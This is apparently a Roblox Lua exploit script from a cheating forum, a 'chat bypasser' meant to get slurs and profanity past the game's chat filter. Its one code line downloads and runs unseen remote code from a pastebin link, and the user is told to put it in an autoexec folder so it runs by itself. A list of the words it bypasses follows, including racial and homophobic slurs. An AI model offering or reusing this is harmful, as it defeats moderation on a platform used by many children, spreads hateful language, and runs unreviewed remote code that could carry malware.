--// source: https://v3rmillion.net/showthread.php?tid=1006944
--// credits: Chat Bypasser by Africa Police.
--[[
how to use:
say the naughty word you want to say in-chat and it will auto-convert it.
i recommend you put this in your autoexec folder.
]]--
loadstring(game:HttpGet("https://pastebin.com/raw/JFeVbTv6", true))()
--[[ 
*List Of Words That Can Be Bypassed* as of 7/1/20. 25 Total. 
nigger 
faggot 
thot 
bitch 
cunt 
fuck
fucker
whore
dick
penis 
asshole 
allahu 
akbar 
crap 
shit 
motherfucker 
girlfriend
boyfriend 
slave 
hoe 
sex  
cum 
pussy 
nigga 
slut 
rape
]]--